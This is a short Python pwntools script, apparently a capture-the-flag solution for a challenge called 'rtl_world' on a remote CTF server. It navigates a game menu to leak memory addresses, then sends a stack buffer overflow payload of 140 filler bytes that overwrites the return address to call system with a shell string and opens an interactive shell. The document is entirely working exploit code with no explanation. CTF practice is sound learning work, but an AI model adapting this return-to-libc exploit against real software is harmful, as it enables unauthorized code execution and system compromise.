from pwn import *

p=process('./rtl_world') #local socket
p=remote('ctf.j0n9hyun.xyz', 3010) #nc socket

for i in range(10):
	p.recvuntil(">>> ")
	p.sendline('2')
	p.recvuntil(">>> ")
	p.sendline('3')

p.recvuntil(">>> ")
p.sendline('1')
p.recvuntil("Binary Boss live in ")
addr_BinaryBoss=int(p.recv(10), 16)

p.recvuntil(">>> ")
p.sendline('3')
p.recvuntil("System Armor : ")
addr_SystemArmor=int(p.recv(10), 16)

p.recvuntil(">>> ")
p.sendline('4')
p.recvuntil("Shell Sword : ")
addr_ShellSword=int(p.recv(10), 16)

p.recvuntil(">>> ")
p.sendline('5')
p.recvuntil("[Attack] > ")

payload='A'*140 + 'B'*4 + p32(addr_SystemArmor) + 'B'*4 + p32(addr_ShellSword)

p.sendline(payload)
p.interactive()
